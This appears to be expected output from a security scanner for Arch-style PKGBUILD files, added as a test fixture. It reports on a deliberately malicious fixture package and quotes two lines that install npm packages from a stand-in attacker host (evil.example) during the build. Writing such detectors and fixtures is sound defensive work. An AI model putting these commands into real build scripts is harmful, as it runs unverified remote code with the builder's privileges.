@@ -1,0 +1,32 @@
+
+Scan Results: nodebuild
+============================================================
+
+[HIGH] ATOMIC-006 npm/bun package installed from a URL or git remote during the build
+    A PKGBUILD function installs a package straight from a URL, git remote or forge shorthand (`npm install git+https://...`, `github:user/repo`). Nothing pins or checksums that code, and it runs its lifecycle scripts as the builder.
+    Location: tests/fixtures/malicious/npm-build-evasion/PKGBUILD:12
+    Code:     _out=$(npm install git+https://evil.example/x.git)
+    Recommendation: Do not build. Fetch the code through source= with a checksum.
+    Reference: CWE-494
+
+[HIGH] ATOMIC-006 npm/bun package installed from a URL or git remote during the build
+    A PKGBUILD function installs a package straight from a URL, git remote or forge shorthand (`npm install git+https://...`, `github:user/repo`). Nothing pins or checksums that code, and it runs its lifecycle scripts as the builder.
+    Location: tests/fixtures/malicious/npm-build-evasion/PKGBUILD:13
+    Code:     ( /usr/bin/npm install -- git+https://evil.example/y.git )
+    Recommendation: Do not build. Fetch the code through source= with a checksum.
+    Reference: CWE-494
+
+[MEDIUM] SRC-005 No sources with build function
+    Package has build() function but no source array
+    Recommendation: Verify this is intentional; build() usually needs sources
+
+
+
+============================================================
+Package: nodebuild v1.0.0-1
+Scan duration: 22ms
+
+Found 3 issue(s):
+  2 HIGH
+  1 MEDIUM
+============================================================
